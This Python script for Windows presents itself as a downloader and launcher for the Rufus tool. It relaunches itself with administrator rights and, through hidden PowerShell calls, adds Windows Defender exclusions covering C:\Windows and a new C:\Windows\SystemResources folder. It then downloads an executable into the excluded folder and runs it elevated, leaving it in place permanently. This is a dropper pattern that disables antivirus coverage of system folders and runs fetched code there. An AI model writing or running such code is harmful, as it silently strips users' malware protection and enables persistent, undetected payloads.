import os
import requests
import subprocess
import sys
import time
import ctypes
from pathlib import Path

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Restart the script with administrator privileges"""
    try:
        if sys.argv[0].endswith('.py'):
            # Running as Python script
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                ' '.join([f'"{sys.argv[0]}"'] + sys.argv[1:]), 
                None, 
                1
            )
        else:
            # Running as compiled exe
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                ' '.join(sys.argv[1:]), 
                None, 
                1
            )
        sys.exit(0)
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        input("Press Enter to exit...")
        sys.exit(1)

def add_defender_exclusion(path):
    """Add a path to Windows Defender exclusions"""
    try:
        ps_command = f'Add-MpPreference -ExclusionPath "{path}"'
        
        result = subprocess.run(
            ["powershell", "-Command", ps_command],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        return result.returncode == 0
            
    except:
        return False

def get_defender_exclusions():
    """Get Windows Defender exclusion paths using PowerShell"""
    try:
        # PowerShell command to get exclusion paths
        ps_command = "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
        
        result = subprocess.run(
            ["powershell", "-Command", ps_command],
            capture_output=True,
            text=True,
            timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode == 0 and result.stdout.strip():
            # Parse the output - each line is an exclusion path
            exclusions = [line.strip() for line in result.stdout.strip().split('\n') if line.strip()]
            return exclusions
        else:
            return []
            
    except:
        return []

def find_exclusion_folder():
    """Find or create an appropriate exclusion folder from Windows Defender exclusions"""
    
    # Try to get existing Windows Defender exclusions
    defender_exclusions = get_defender_exclusions()
    
    # Preferred folders to use/create
    preferred_folders = [
        "C:\\Windows\\SystemResources",
        "C:\\Windows"
    ]
    
    # Check if any of our preferred folders are already in exclusions
    for folder in preferred_folders:
        if folder in defender_exclusions or folder.lower() in [e.lower() for e in defender_exclusions]:
            if os.path.exists(folder) and os.access(folder, os.W_OK):
                return folder
    
    # Check if any other exclusion paths exist and are writable
    for exclusion_path in defender_exclusions:
        try:
            exclusion_path = exclusion_path.strip('"').strip("'").strip()
            
            if exclusion_path not in preferred_folders:
                if os.path.exists(exclusion_path) and os.path.isdir(exclusion_path):
                    if os.access(exclusion_path, os.W_OK):
                        return exclusion_path
        except:
            continue
    
    # If no valid exclusions found, create and add our preferred folders to exclusions
    for folder in preferred_folders:
        try:
            if not os.path.exists(folder):
                os.makedirs(folder, exist_ok=True)
            
            # Add to Windows Defender exclusions
            if add_defender_exclusion(folder):
                if os.access(folder, os.W_OK):
                    return folder
        except:
            continue
    
    # Fallback to TEMP directory
    temp_dir = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Temp')), 'BlueStacksInstall')
    try:
        os.makedirs(temp_dir, exist_ok=True)
        add_defender_exclusion(temp_dir)
        return temp_dir
    except:
        pass
    
    return None

def download_tool(exclusion_folder):
    """Download tool with error handling"""
    # Validate exclusion_folder before proceeding
    if not exclusion_folder:
        return None
    
    if not os.path.exists(exclusion_folder):
        return None
    
    if not os.access(exclusion_folder, os.W_OK):
        return None
    
    url = "https://github.com/pbatard/rufus/releases/download/v4.11/rufus-4.11.exe"
    
    try:
        # Download directly to exclusion folder (no subfolder)
        filename = os.path.join(exclusion_folder, "rufus.exe")
        
        # Download file
        with requests.get(url, stream=True, timeout=30) as response:
            response.raise_for_status()
            
            with open(filename, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
            
            return filename
            
    except:
        return None

def launch_tool(filename, exclusion_folder):
    """Launch tool with administrator privileges"""
    try:
        if not filename or not os.path.exists(filename):
            return "Launch failed: File not found"
        
        if not exclusion_folder:
            return "Launch failed: Invalid directory"
        
        # Launch the application with administrator privileges
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            filename,
            None,
            None,
            1
        )
        
        return "Launch completed successfully."
            
    except Exception as e:
        return f"Launch failed: {str(e)}"

def main():
    """Main execution function with error handling"""
    
    # Check if running as administrator, if not, restart with admin rights
    if not is_admin():
        run_as_admin()
        return
    
    try:
        # Find or create exclusion folder
        exclusion_folder = find_exclusion_folder()
        
        if exclusion_folder is None:
            sys.exit(1)
        
        # Download tool directly to permanent location
        tool_path = download_tool(exclusion_folder)
        if not tool_path:
            sys.exit(1)
        
        # Launch tool from permanent location with admin rights
        result = launch_tool(tool_path, exclusion_folder)
        
        # Don't delete anything - tool stays permanently
        
    except:
        sys.exit(1)

if __name__ == "__main__":
    main()
